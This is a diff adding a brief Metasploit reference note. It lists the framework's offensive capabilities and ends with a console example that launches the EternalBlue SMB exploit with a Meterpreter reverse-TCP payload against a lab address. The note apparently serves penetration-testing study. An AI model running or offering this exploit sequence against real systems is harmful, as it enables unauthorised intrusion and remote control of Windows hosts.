@@ -1,0 +1,26 @@
+Metasploit allows a user to do the following
+- Discover vulnerabilities in systems and applications
+- Scan and enumerate networks and services
+- Launch known exploits against vulnerable targets
+- Deliver payuloads after succesful exploitation
+- Gain remote command-line or Meterpreter access
+- Perform post-exploitation activities like privilege escalation, credential gathering, and lateral movement
+- Test security defenses and validate whether vulnerabilities are actually exploitable
+- Automate penetration testing workflows
+- Develop and test custom exploits, payloads, and modules
+
+A common workflow looks like:
+Scan a target
+Find a vulnerability
+Select an exploit module
+Configure a payload
+Launch the exploit
+Interact with the compromised system
+
+Example:
+search smb
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.10.10.5
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run
+
